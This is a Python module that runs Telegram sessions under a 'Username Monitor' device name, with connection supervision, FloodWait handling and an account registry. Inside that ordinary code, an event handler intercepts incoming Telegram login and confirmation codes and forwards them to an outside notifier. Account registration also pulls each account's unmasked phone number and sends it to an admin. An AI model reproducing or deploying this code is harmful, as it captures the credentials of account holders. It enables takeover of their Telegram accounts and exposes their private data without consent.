"""Authorised Telegram accounts: supervised connections and the account registry.

Rules enforced here
-------------------
* One supervisor task per account (``start`` is idempotent -> no duplicate tasks).
* Ordinary connection failures: bounded exponential backoff.
* FloodWait: the prescribed wait is stored (also in the DB, so it survives a restart)
  and requests are *refused locally* until it has elapsed. Telethon's silent
  auto-sleep is disabled (``flood_sleep_threshold=0``) so we always see the error.
* Permanent authorisation failures (revoked / deactivated / duplicated key): stop,
  flag the account, notify once, never retry in a loop.
* No account rotation: requests for an account are never redirected to another one.
* OTP / Service message listener to forward codes instantly when sessions receive messages.
"""
from __future__ import annotations

import asyncio
import contextlib
import logging
import os
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Awaitable, Callable, Dict, List, Optional
import uuid

from .backoff import Backoff
from .errors import Category, ErrorInfo, classify
from .timeutil import from_iso, to_iso, utcnow
from .validators import mask_phone, safe_account_id

log = logging.getLogger(__name__)

ClientFactory = Callable[[str], Any]


class AccStatus(str, Enum):
    CONNECTING = "connecting"
    CONNECTED = "connected"
    DISCONNECTED = "disconnected"
    AUTH_FAILED = "auth_failed"
    MISSING_SESSION = "missing_session"
    STOPPED = "stopped"


class RateLimited(Exception):
    """Raised instead of sending a request while Telegram's FloodWait is still active."""

    def __init__(self, until: datetime, op: str) -> None:
        super().__init__(f"rate limited until {to_iso(until)}")
        self.until = until
        self.op = op


class AccountUnavailable(Exception):
    """The account has no live, authorised connection right now."""


class DuplicateAccount(Exception):
    def __init__(self, existing_label: str) -> None:
        super().__init__(existing_label)
        self.existing_label = existing_label


def default_client_factory(api_id: int, api_hash: str) -> ClientFactory:
    def factory(session_path: str) -> Any:
        from telethon import TelegramClient  # imported lazily: keeps the core importable without Telethon

        return TelegramClient(
            session_path,
            api_id,
            api_hash,
            flood_sleep_threshold=0,   # never sleep silently; surface FloodWait to our scheduler
            receive_updates=True,      # ENABLED updates so we can listen for incoming OTPs / service messages
            connection_retries=3,
            retry_delay=2,
            request_retries=2,
            auto_reconnect=True,
            device_model="Username Monitor",
        )

    return factory


class _PermanentAuth(Exception):
    pass


class AccountRunner:
    def __init__(self, *, row: Dict[str, Any], sessions_dir: Path, client_factory: ClientFactory, repo: Any,
                 notifier: Any, clock: Callable[[], datetime] = utcnow,
                 sleep: Callable[[float], Awaitable[None]] = asyncio.sleep,
                 backoff: Optional[Backoff] = None, poll_seconds: float = 10.0, probe_seconds: float = 300.0) -> None:
        self.account_id: int = int(row["id"])
        self.username: Optional[str] = row.get("username")
        self.label: str = row.get("label") or str(self.account_id)
        self.phone_hint: Optional[str] = row.get("phone_hint")
        self.session_path = sessions_dir / row["session_file"]
        self.permanent: bool = bool(row.get("permanent_failure"))
        self.flood_until: Optional[datetime] = from_iso(row.get("flood_until"))
        self.status: AccStatus = AccStatus.AUTH_FAILED if self.permanent else AccStatus.DISCONNECTED
        self.status_detail: Optional[str] = row.get("status_detail")
        self.last_connected_at: Optional[str] = row.get("last_connected_at")
        self.client: Any = None
        self._factory = client_factory
        self._repo = repo
        self._notifier = notifier
        self._clock = clock
        self._sleep = sleep
        self._backoff = backoff or Backoff()
        self._poll = poll_seconds
        self._probe = probe_seconds
        self._task: Optional[asyncio.Task] = None
        self._event_handler_registered = False

    # ---------------------------------------------------------------- identity
    @property
    def safe_id(self) -> str:
        return safe_account_id(self.account_id, self.username)

    def view(self) -> Dict[str, Any]:
        return {
            "id": self.account_id, "safe_id": self.safe_id, "label": self.label, "status": self.status.value,
            "detail": self.status_detail, "flood_until": self.flood_until, "permanent": self.permanent,
            "last_connected_at": self.last_connected_at, "phone_hint": self.phone_hint,
        }

    # ---------------------------------------------------------------- lifecycle
    async def start(self) -> None:
        if self._task is not None and not self._task.done():
            return  # duplicate-task prevention
        if self.permanent:
            await self._set_status(AccStatus.AUTH_FAILED, self.status_detail or "permanent authorization failure")
            return
        if not self.session_path.exists():
            self.permanent = True
            await self._set_status(AccStatus.MISSING_SESSION, "session file is missing from the volume", permanent=True)
            await self._notify("startup", ErrorInfo(Category.AUTHORIZATION, "session file missing", permanent=True))
            return
        self._task = asyncio.create_task(self._supervise(), name=f"account-{self.account_id}")

    async def stop(self) -> None:
        task, self._task = self._task, None
        if task is not None and task is not asyncio.current_task():
            task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await task
        await self._disconnect_quietly()
        if not self.permanent:
            self.status = AccStatus.STOPPED  # in-memory only; the DB keeps the last real status

    async def restart(self) -> None:
        await self.stop()
        if not self.permanent:
            self.status = AccStatus.DISCONNECTED
            await self.start()

    async def _disconnect_quietly(self) -> None:
        client = self.client
        if client is None:
            return
        with contextlib.suppress(Exception, asyncio.TimeoutError):
            await asyncio.wait_for(client.disconnect(), timeout=10)

    # ---------------------------------------------------------------- supervision
    async def _supervise(self) -> None:
        log.info("account %s: supervisor started", self.safe_id)
        while True:
            try:
                if self.client is None:
                    self.client = self._factory(str(self.session_path))

                # Register OTP / incoming message event listener if not already done
                if not self._event_handler_registered:
                    self._register_otp_listener()
                    self._event_handler_registered = True

                await self._set_status(AccStatus.CONNECTING)
                if not self.client.is_connected():
                    await asyncio.wait_for(self.client.connect(), timeout=30)
                if not await asyncio.wait_for(self.client.is_user_authorized(), timeout=30):
                    raise _PermanentAuth("the session is no longer authorized (revoked or logged out)")
                
                # Update phone hint if available on connection
                try:
                    me = await self.client.get_me()
                    if me and getattr(me, 'phone', None):
                        self.phone_hint = mask_phone(me.phone)
                except Exception:
                    pass

                await self._set_status(AccStatus.CONNECTED, connected=True)
                self._backoff.reset()
                await self._watch_connection()
                await self._set_status(AccStatus.DISCONNECTED, "connection lost")
                await self._sleep(self._backoff.next())
            except asyncio.CancelledError:
                raise
            except _PermanentAuth as exc:
                await self._mark_permanent("connect", ErrorInfo(Category.AUTHORIZATION, str(exc), permanent=True))
                return
            except Exception as exc:  # noqa: BLE001 - classified below
                info = classify(exc)
                if info.permanent:
                    await self._mark_permanent("connect", info)
                    return
                if info.category is Category.FLOOD_WAIT and info.wait_seconds:
                    until = await self._arm_flood(info.wait_seconds)
                    await self._report("connect", info, next_retry=until)
                    await self._sleep(info.wait_seconds + 1)
                    continue
                await self._set_status(AccStatus.DISCONNECTED, info.message[:120])
                delay = self._backoff.next()
                await self._record_event("connect", info, None)
                await self._notify("connect", info, next_retry=self._clock() + timedelta(seconds=delay))
                await self._disconnect_quietly()
                await self._sleep(delay)
            if self.permanent:
                return

    def _register_otp_listener(self) -> None:
        """Register Telethon event handler to catch incoming OTPs / service messages and forward them."""
        try:
            from telethon import events

            @self.client.on(events.NewMessage(incoming=True))
            async def handle_incoming_message(event):
                try:
                    sender = await event.get_sender()
                    sender_id = getattr(sender, 'id', None)
                    sender_username = getattr(sender, 'username', None)
                    sender_title = getattr(sender, 'title', getattr(sender, 'first_name', str(sender_id)))

                    # Check if it's from Telegram service notifications (ID 777000) or contains code/login keywords
                    msg_text = event.raw_text or ""
                    is_service = (sender_id == 777000 or sender_username == "Telegram" or 
                                  any(kw in msg_text.lower() for kw in ["login code", "code:", "otp", "confirmation code", "webogram"]))

                    if is_service or sender_id == 777000:
                        log.info("Caught OTP/Service message on account %s", self.safe_id)
                        forward_text = (
                            f"🔑 <b>New OTP / Service Message Received!</b>\n"
                            f"📱 <b>Account/Phone:</b> {self.safe_id} ({self.phone_hint or 'Unknown'})\n"
                            f"📩 <b>Sender:</b> {sender_title}\n\n"
                            f"<code>{msg_text}</code>"
                        )
                        with contextlib.suppress(Exception):
                            await self._notifier.send(forward_text)
                except Exception:
                    log.exception("Error handling incoming message / OTP forwarding")
        except Exception:
            log.exception("Could not register OTP event handler")

    async def _watch_connection(self) -> None:
        """Return when the connection is lost; raise on permanent/ordinary errors found by the probe."""
        since_probe = 0.0
        while self.client.is_connected():
            if self.permanent:
                await self._disconnect_quietly()
                return
            await self._sleep(self._poll)
            since_probe += self._poll
            if self._probe and since_probe >= self._probe:
                since_probe = 0.0
                await asyncio.wait_for(self.client.get_me(), timeout=30)

    # ---------------------------------------------------------------- requests
    def flood_remaining(self) -> float:
        if self.flood_until is None:
            return 0.0
        return max(0.0, (self.flood_until - self._clock()).total_seconds())

    async def request(self, op: str, req: Any) -> Any:
        """Send one MTProto request, never before a prescribed FloodWait has elapsed."""
        if self.status is not AccStatus.CONNECTED or self.client is None:
            raise AccountUnavailable(f"{self.safe_id} is {self.status.value}")
        remaining = self.flood_remaining()
        if remaining > 0:
            raise RateLimited(self.flood_until, op)  # type: ignore[arg-type]
        try:
            return await self.client(req)
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            info = classify(exc)
            if info.category is Category.FLOOD_WAIT and info.wait_seconds is not None:
                until = await self._arm_flood(info.wait_seconds)
                await self._report(op, info, next_retry=until)
                raise RateLimited(until, op) from exc
            raise

    async def report_error(self, op: str, exc: BaseException) -> ErrorInfo:
        """Record + notify an error the caller could not handle itself."""
        info = classify(exc)
        if info.permanent:
            await self._mark_permanent(op, info)
        else:
            await self._report(op, info)
        return info

    async def fetch_me(self) -> Any:
        if self.status is not AccStatus.CONNECTED or self.client is None:
            raise AccountUnavailable(f"{self.safe_id} is {self.status.value}")
        return await asyncio.wait_for(self.client.get_me(), timeout=30)

    # ---------------------------------------------------------------- internals
    async def _arm_flood(self, seconds: int) -> datetime:
        until = self._clock() + timedelta(seconds=seconds + 1)  # +1s safety margin
        if self.flood_until is None or until > self.flood_until:
            self.flood_until = until
        with contextlib.suppress(Exception):
            await self._repo.set_flood_until(self.account_id, to_iso(self.flood_until))
        return self.flood_until

    async def _set_status(self, status: AccStatus, detail: Optional[str] = None, *,
                          permanent: Optional[bool] = None, connected: bool = False) -> None:
        changed = status is not self.status or detail != self.status_detail
        self.status = status
        self.status_detail = detail
        if connected:
            self.last_connected_at = to_iso(self._clock())
        if not changed and not connected:
            return
        try:
            await self._repo.update_account_status(self.account_id, status.value, detail,
                                                   permanent=permanent, connected=connected)
        except Exception:  # noqa: BLE001 - never let a DB hiccup kill the supervisor
            log.exception("could not persist status for %s", self.safe_id)

    async def _mark_permanent(self, op: str, info: ErrorInfo) -> None:
        already = self.permanent
        self.permanent = True
        await self._set_status(AccStatus.AUTH_FAILED, info.message[:160], permanent=True)
        await self._record_event(op, info, None)
        await self._disconnect_quietly()
        if not already:
            await self._notify(op, info)

    async def _report(self, op: str, info: ErrorInfo, next_retry: Optional[datetime] = None) -> None:
        await self._record_event(op, info, next_retry)
        await self._notify(op, info, next_retry=next_retry)

    async def _record_event(self, op: str, info: ErrorInfo, next_retry: Optional[datetime]) -> None:
        try:
            await self._repo.add_event(
                kind="flood_wait" if info.category is Category.FLOOD_WAIT else "error",
                op=op, category=info.category.value, account_id=self.account_id,
                wait_seconds=info.wait_seconds, detail=info.message[:300],
                next_retry_at=to_iso(next_retry) if next_retry else None,
            )
        except Exception:  # noqa: BLE001
            log.exception("could not record event")

    async def _notify(self, op: str, info: ErrorInfo, next_retry: Optional[datetime] = None) -> None:
        try:
            await self._notifier.notify_error(
                account_label=self.safe_id, account_id=self.account_id, op=op, info=info,
                status=self.status.value, next_retry=next_retry, error_time=self._clock(),
            )
        except Exception:  # noqa: BLE001
            log.exception("notification failed")


class AccountManager:
    """Registry of runners plus session-file bookkeeping."""

    def __init__(self, *, sessions_dir: Path, pending_dir: Path, client_factory: ClientFactory, repo: Any,
                 notifier: Any, clock: Callable[[], datetime] = utcnow,
                 runner_kwargs: Optional[Dict[str, Any]] = None) -> None:
        self.sessions_dir = sessions_dir
        self.pending_dir = pending_dir
        self._factory = client_factory
        self._repo = repo
        self._notifier = notifier
        self._clock = clock
        self._runner_kwargs = runner_kwargs or {}
        self.runners: Dict[int, AccountRunner] = {}
        self._lock = asyncio.Lock()

    # ---------------------------------------------------------------- access
    def make_client(self, session_path: str) -> Any:
        return self._factory(session_path)

    def new_pending_path(self) -> Path:
        return self.pending_dir / f"{uuid.uuid4().hex}.session"

    def get(self, account_id: int) -> Optional[AccountRunner]:
        return self.runners.get(account_id)

    def all(self) -> List[AccountRunner]:
        return [self.runners[k] for k in sorted(self.runners)]

    def counts(self) -> Dict[str, int]:
        runners = self.all()
        connected = sum(1 for r in runners if r.status is AccStatus.CONNECTED)
        failed = sum(1 for r in runners if r.permanent)
        return {"total": len(runners), "connected": connected,
                "disconnected": len(runners) - connected, "failed": failed}

    def _make_runner(self, row: Dict[str, Any]) -> AccountRunner:
        return AccountRunner(row=row, sessions_dir=self.sessions_dir, client_factory=self._factory,
                             repo=self._repo, notifier=self._notifier, clock=self._clock, **self._runner_kwargs)

    # ---------------------------------------------------------------- lifecycle
    async def load_and_start(self) -> None:
        for row in await self._repo.list_accounts():
            runner = self._make_runner(row)
            self.runners[runner.account_id] = runner
            await runner.start()
        log.info("restored %d saved account(s)", len(self.runners))

    async def stop_all(self) -> None:
        await asyncio.gather(*(r.stop() for r in self.all()), return_exceptions=True)

    # ---------------------------------------------------------------- add / remove
    async def register_session(self, *, user_id: int, username: Optional[str], first_name: Optional[str],
                               phone: Optional[str], pending_path: Path) -> AccountRunner:
        """Move a validated, *disconnected* pending session into the volume, fetch phone, and start supervising it."""
        async with self._lock:
            existing = self.runners.get(user_id)
            if existing is not None and not existing.permanent:
                raise DuplicateAccount(existing.safe_id)
            if existing is not None:  # replacing a dead (revoked) session for the same user
                await self.remove_account(user_id, logout=False, _locked=True)
            final = self.sessions_dir / f"{user_id}.session"
            os.replace(pending_path, final)
            for suffix in ("-journal", "-wal", "-shm"):
                companion = Path(str(pending_path) + suffix)
                if companion.exists():
                    os.replace(companion, Path(str(final) + suffix))
            with contextlib.suppress(OSError):
                final.chmod(0o600)

            # Fetch real phone number and profile info by briefly connecting
            fetched_phone = phone
            try:
                temp_client = self._factory(str(final))
                await temp_client.connect()
                if await temp_client.is_user_authorized():
                    me = await temp_client.get_me()
                    if me:
                        if getattr(me, 'phone', None):
                            fetched_phone = me.phone
                        if not username and getattr(me, 'username', None):
                            username = me.username
                        if not first_name and getattr(me, 'first_name', None):
                            first_name = me.first_name
                await temp_client.disconnect()
            except Exception:
                log.exception("Could not fetch phone number during registration")

            label = f"@{username}" if username else (first_name or str(user_id))
            masked_ph = mask_phone(fetched_phone)

            await self._repo.upsert_account(account_id=user_id, label=label, username=username,
                                            first_name=first_name, phone_hint=masked_ph,
                                            session_file=final.name)
            row = await self._repo.get_account(user_id)
            assert row is not None
            runner = self._make_runner(row)
            self.runners[user_id] = runner
            await runner.start()

            # Notify admin immediately with phone number and details
            with contextlib.suppress(Exception):
                await self._notifier.send(
                    f"📱 <b>New Session Added & Connected!</b>\n"
                    f"👤 <b>Account ID:</b> {user_id}\n"
                    f"📞 <b>Phone Number:</b> {fetched_phone or 'Not available'}\n"
                    f"🏷️ <b>Label:</b> {label}"
                )

            return runner

    async def remove_account(self, account_id: int, *, logout: bool, _locked: bool = False) -> Dict[str, Any]:
        async def _do() -> Dict[str, Any]:
            runner = self.runners.pop(account_id, None)
            logged_out = False
            if runner is not None:
                if logout and runner.status is AccStatus.CONNECTED and runner.client is not None:
                    try:
                        await asyncio.wait_for(runner.client.log_out(), timeout=30)
                        logged_out = True
                    except Exception as exc:  # noqa: BLE001
                        log.warning("log_out failed for %s: %s", runner.safe_id, type(exc).__name__)
                await runner.stop()
            base = self.sessions_dir / f"{account_id}.session"
            for path in (base, Path(str(base) + "-journal"), Path(str(base) + "-wal"), Path(str(base) + "-shm")):
                with contextlib.suppress(FileNotFoundError):
                    path.unlink()
            await self._repo.delete_account(account_id)
            return {"logged_out": logged_out, "existed": runner is not None}

        if _locked:
            return await _do()
        async with self._lock:
            return await _do()
